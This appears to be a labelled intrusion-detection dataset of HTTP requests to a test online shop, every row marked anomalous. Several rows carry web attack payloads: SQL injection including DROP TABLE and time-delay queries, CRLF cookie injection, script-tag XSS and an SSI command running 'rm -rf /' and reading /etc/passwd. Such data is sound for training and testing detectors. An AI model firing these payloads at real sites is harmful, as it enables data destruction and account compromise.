GET,http://localhost:8080/tienda1/miembros/index.jsp/4861362529278789730.INC,,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=benschop&password=164O%2B1I0&nombre=Tersif%F3n&apellidos=Buj+Andunce&email=kendell%40multasdetransito.dj&dni=98715726W&direccion=C%2F+Copernic+161+3%3FB&ciudad=Castillonroy&cp=06190&provincia=Guadalajara&ntc=233062348355342&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=benschop&password=164O%2B1I0&nombre=Tersif%F3n&apellidos=Buj+Andunce&email=kendell%40multasdetransito.dj&dni=98715726W&direccion=C%2F+Copernic+161+3%3FB&ciudad=Castillonroy&cp=06190&provincia=Guadalajara&ntc=233062348355342&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=benschop&password=164O%2B1I0&nombre=Tersif%F3n&apellidos=Buj+Andunce&emailA=kendell%40multasdetransito.dj&dni=98715726W&direccion=C%2F+Copernic+161+3%3FB&ciudad=Castillonroy&cp=06190&provincia=Guadalajara&ntc=0622727405065528&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=benschop&password=164O%2B1I0&nombre=Tersif%F3n&apellidos=Buj+Andunce&emailA=kendell%40multasdetransito.dj&dni=98715726W&direccion=C%2F+Copernic+161+3%3FB&ciudad=Castillonroy&cp=06190&provincia=Guadalajara&ntc=0622727405065528&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/asf-logo-wide,,anomalous
GET,http://localhost:8080/examplesWebApp/WebservicesEJB.jsp,,anomalous
GET,http://localhost:8080/tienda1/miembros/salir.jsp/asf-logo-wide.gif/.old,,anomalous
GET,http://localhost:8080/tienda1/imagenes/6909030637832563290.jsp,,anomalous
GET,http://localhost:8080/tienda1/imagenes/1.gif.OLD,,anomalous
GET,http://localhost:8080/tienda1/4861362529278789730.java,,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=100%2F&cantidad=60&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombre=Queso+Manchego&precio=100%2F&cantidad=60&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombreA=Queso+Manchego&precio=100&cantidad=60&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombreA=Queso+Manchego&precio=100&cantidad=60&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&login=jeanes&pwd=d%F3712&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&login=jeanes&pwd=d%F3712&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=jeanes&pwd=%2C%27caire&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=jeanes&pwd=%2C%27caire&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=jeanes&pwd=d%F3712&rememberA=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=jeanes&pwd=d%F3712&rememberA=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,idA=2,anomalous
GET,http://localhost:8080/samples/sampsite/sendme.htm,,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%2500,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=%2500,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp.OLD,,anomalous
GET,http://localhost:8080/tienda1/publico/miembros.jsp/asf-logo-wide.gif~,,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%2B&precio=514&B1=Pasar+por+caja,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar%2B&precio=514&B1=Pasar+por+caja,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=514&B1A=Pasar+por+caja,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=514&B1A=Pasar+por+caja,anomalous
GET,http://localhost:8080/tienda1/publico/productos.jsp/6909030637832563290.jsp.INC,,anomalous
PUT,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=oberon&password=atab2rdi8la7O&nombre=Adelfo&apellidos=Stumptner&email=lembeck%40tuslimites.fo&dni=72510261R&direccion=Passeig+Bejar%2C+173+2H&ciudad=Quir%F3s&cp=41930&provincia=Girona&ntc=9285059001165712&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=hu*yv%3Fan&password=atab2rdi8la7O&nombre=Adelfo&apellidos=Stumptner&email=lembeck%40tuslimites.fo&dni=72510261R&direccion=Passeig+Bejar%2C+173+2H&ciudad=Quir%F3s&cp=41930&provincia=Girona&ntc=9285059001165712&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=hu*yv%3Fan&password=atab2rdi8la7O&nombre=Adelfo&apellidos=Stumptner&email=lembeck%40tuslimites.fo&dni=72510261R&direccion=Passeig+Bejar%2C+173+2H&ciudad=Quir%F3s&cp=41930&provincia=Girona&ntc=9285059001165712&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/4861362529278789730~,,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,anomalous
GET,http://localhost:8080/tienda1/asf-logo-wide.gif/.Old,,anomalous
GET,http://localhost:8080/tienda1/global.inc,,anomalous
GET,http://localhost:8080/tienda1/global/estilos.css/6909030637832563290.jsp,,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=olson&password=conFesuR%CDA&nombre=Aberardo&apellidos=Segovia&email=raya%40acumulador.com.iq&dni=06076324T&direccion=Calle+Atarfe%F1o%2C+1%2B15%2C+&ciudad=Marug%E1n&cp=15589&provincia=Lleida&ntc=0903154438828489&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=olson&password=conFesuR%CDA&nombre=Aberardo&apellidos=Segovia&email=raya%40acumulador.com.iq&dni=06076324T&direccion=Calle+Atarfe%F1o%2C+1%2B15%2C+&ciudad=Marug%E1n&cp=15589&provincia=Lleida&ntc=0903154438828489&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&loginA=olson&password=conFesuR%CDA&nombre=Aberardo&apellidos=Segovia&email=raya%40acumulador.com.iq&dni=06076324T&direccion=Calle+Rio+Pisuerga+34+&ciudad=Marug%E1n&cp=15589&provincia=Lleida&ntc=0903154438828489&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&loginA=olson&password=conFesuR%CDA&nombre=Aberardo&apellidos=Segovia&email=raya%40acumulador.com.iq&dni=06076324T&direccion=Calle+Rio+Pisuerga+34+&ciudad=Marug%E1n&cp=15589&provincia=Lleida&ntc=0903154438828489&B1=Registrar,anomalous
GET,http://localhost:8080.BAK,,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=%27+AND+%271%27%3D%271&precio=100&cantidad=48&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=1&nombre=%27+AND+%271%27%3D%271&precio=100&cantidad=48&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+.*%3FRioja&precio=100&cantidad=48&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=1&nombre=Vino+.*%3FRioja&precio=100&cantidad=48&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?idA=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=48&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,idA=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=48&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=villella&pwd=5e04ayo&remember=on%2F&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=villella&pwd=5e04ayo&remember=on%2F&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modoA=entrar&login=villella&pwd=5e04ayo&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modoA=entrar&login=villella&pwd=5e04ayo&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=1%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,idA=1,anomalous
GET,http://localhost:8080/_cti_pvt/linkinfo.cnf,,anomalous
GET,http://localhost:8080/tienda1/publico/carrito.jsp/.BAK,,anomalous
PUT,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectas,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=40&B1=Pasar+por+caja%2F,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=40&B1=Pasar+por+caja%2F,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=40&B1=Confirmar,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modoA=insertar&precio=40&B1=Confirmar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=pravato&password=rastrero&nombre=Robustiana&apellidos=Laspiur%27+AND+%271%27%3D%271&email=kurz%40kayaalicante.cn&dni=60962318J&direccion=C%2F+Santa+Anna%2C+S%2FN+&ciudad=Villaespasa&cp=26292&provincia=Navarra&ntc=8682803216185712&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=pravato&password=rastrero&nombre=Robustiana&apellidos=Laspiur%27+AND+%271%27%3D%271&email=kurz%40kayaalicante.cn&dni=60962318J&direccion=C%2F+Santa+Anna%2C+S%2FN+&ciudad=Villaespasa&cp=26292&provincia=Navarra&ntc=8682803216185712&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=pravato&password=rastrero&nombre=Robustiana&apellidos=Laspiur&email=kurz%40kayaalicante.cn&dni=60962318J&direccion=C%2F+Santa+Anna%2C+S%2FN+&ciudad=Villaespasa&cp=26292&provincia=Navarra&ntc=%7C&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=pravato&password=rastrero&nombre=Robustiana&apellidos=Laspiur&email=kurz%40kayaalicante.cn&dni=60962318J&direccion=C%2F+Santa+Anna%2C+S%2FN+&ciudad=Villaespasa&cp=26292&provincia=Navarra&ntc=%7C&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=pravato&password=rastrero&nombre=Robustiana&apellidos=Laspiur&email=kurz%40kayaalicante.cn&dni=52%2763986G&direccion=C%2F+Santa+Anna%2C+S%2FN+&ciudad=Villaespasa&cp=26292&provincia=Navarra&ntc=8682803216185712&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=pravato&password=rastrero&nombre=Robustiana&apellidos=Laspiur&email=kurz%40kayaalicante.cn&dni=52%2763986G&direccion=C%2F+Santa+Anna%2C+S%2FN+&ciudad=Villaespasa&cp=26292&provincia=Navarra&ntc=8682803216185712&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=pravato&password=rastrero&nombre=Robustiana&apellidos=Laspiur&emailA=kurz%40kayaalicante.cn&dni=60962318J&direccion=C%2F+Santa+Anna%2C+S%2FN+&ciudad=Villaespasa&cp=26292&provincia=Navarra&ntc=8682803216185712&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=pravato&password=rastrero&nombre=Robustiana&apellidos=Laspiur&emailA=kurz%40kayaalicante.cn&dni=60962318J&direccion=C%2F+Santa+Anna%2C+S%2FN+&ciudad=Villaespasa&cp=26292&provincia=Navarra&ntc=8682803216185712&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp/,,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%253F,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=%253F,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,anomalous
GET,http://localhost:8080/.bak,,anomalous
GET,http://localhost:8080/tienda1/global/estilos.css.INC,,anomalous
GET,http://localhost:8080/tienda1/miembros/imagenes/castro.jpg.Inc,,anomalous
GET,http://localhost:8080/estore/index.html,,anomalous
GET,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg/asf-logo-wide.OLD,,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kh%27ez%3Fri&password=2ic15&nombre=Amando&apellidos=Mompart+Anglaril&email=parente%40espaciopintor.ro&dni=65049815L&direccion=Plza.+Pablo+Picasso+198+4-C&ciudad=Villamoronta&cp=03517&provincia=Teruel&ntc=8000827068875110&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=kh%27ez%3Fri&password=2ic15&nombre=Amando&apellidos=Mompart+Anglaril&email=parente%40espaciopintor.ro&dni=65049815L&direccion=Plza.+Pablo+Picasso+198+4-C&ciudad=Villamoronta&cp=03517&provincia=Teruel&ntc=8000827068875110&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=pojanart&password=2ic15&nombre=Amando&apellidos=Mompart+Anglaril&emailA=parente%40espaciopintor.ro&dni=65049815L&direccion=Plza.+Pablo+Picasso+198+4-C&ciudad=Villamoronta&cp=03517&provincia=Teruel&ntc=8000827068875110&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=pojanart&password=2ic15&nombre=Amando&apellidos=Mompart+Anglaril&emailA=parente%40espaciopintor.ro&dni=65049815L&direccion=Plza.+Pablo+Picasso+198+4-C&ciudad=Villamoronta&cp=03517&provincia=Teruel&ntc=8000827068875110&B1=Registrar,anomalous
GET,http://localhost:8080/asf-logo-wide,,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=2%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Queso+Manchego&precio=85&cantidad=58&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=2%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Queso+Manchego&precio=85&cantidad=58&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+.*%3FRioja&precio=85&cantidad=58&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombre=Vino+.*%3FRioja&precio=85&cantidad=58&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precioA=85&cantidad=58&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombre=Queso+Manchego&precioA=85&cantidad=58&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/asf-logo-wide.gif,,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=*%2Fvander%27we&pwd=pazguat5&remember=off&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=*%2Fvander%27we&pwd=pazguat5&remember=off&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=johanne&pwdA=pazguat5&remember=off&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=johanne&pwdA=pazguat5&remember=off&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp/asf-logo-wide.gif/.Old,,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1any%250ASet-cookie%253A%2BTamper%253D1041264011025374727,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=1any%250ASet-cookie%253A%2BTamper%253D1041264011025374727,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,idA=1,anomalous
GET,http://localhost:8080/tienda1/publico/carrito.jsp.old,,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas,anomalous
GET,http://localhost:8080/portalAppAdmin/login.jsp,,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4689&B1=Confirmar%27OR%27a%3D%27a,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=4689&B1=Confirmar%27OR%27a%3D%27a,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=%22+AND+%221%22%3D%221&B1=Confirmar,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=%22+AND+%221%22%3D%221&B1=Confirmar,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4689&B1=Confirmar%2F,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=4689&B1=Confirmar%2F,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4689&B1A=Confirmar,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=4689&B1A=Confirmar,anomalous
GET,http://localhost:8080.Inc,,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=craig-du&password=8rre0dad7ra&nombre=Octavia&apellidos=Yaben+Billini&email=formichi%40nevadahispanica.pt&dni=09082221G&direccion=Avinguda+Gatassa+S%2FN+5Aany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&ciudad=Olmedillo+de+Roa&cp=39255&provincia=Ourense&ntc=9946991800186707&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=craig-du&password=8rre0dad7ra&nombre=Octavia&apellidos=Yaben+Billini&email=formichi%40nevadahispanica.pt&dni=09082221G&direccion=Avinguda+Gatassa+S%2FN+5Aany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&ciudad=Olmedillo+de+Roa&cp=39255&provincia=Ourense&ntc=9946991800186707&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=craig-du&password=8rre0dad7ra&nombre=Octavia&apellidos=Yaben+Billini&email=jade%40antiviru%40sgra%40tuitos.gs&dni=09082221G&direccion=Avinguda+Gatassa+S%2FN+5A&ciudad=Olmedillo+de+Roa&cp=39255&provincia=Ourense&ntc=9946991800186707&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=craig-du&password=8rre0dad7ra&nombre=Octavia&apellidos=Yaben+Billini&email=jade%40antiviru%40sgra%40tuitos.gs&dni=09082221G&direccion=Avinguda+Gatassa+S%2FN+5A&ciudad=Olmedillo+de+Roa&cp=39255&provincia=Ourense&ntc=9946991800186707&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&loginA=craig-du&password=8rre0dad7ra&nombre=Octavia&apellidos=Yaben+Billini&email=formichi%40nevadahispanica.pt&dni=09082221G&direccion=Avinguda+Gatassa+S%2FN+5A&ciudad=Olmedillo+de+Roa&cp=39255&provincia=Ourense&ntc=9946991800186707&B1=Registrar,,anomalous
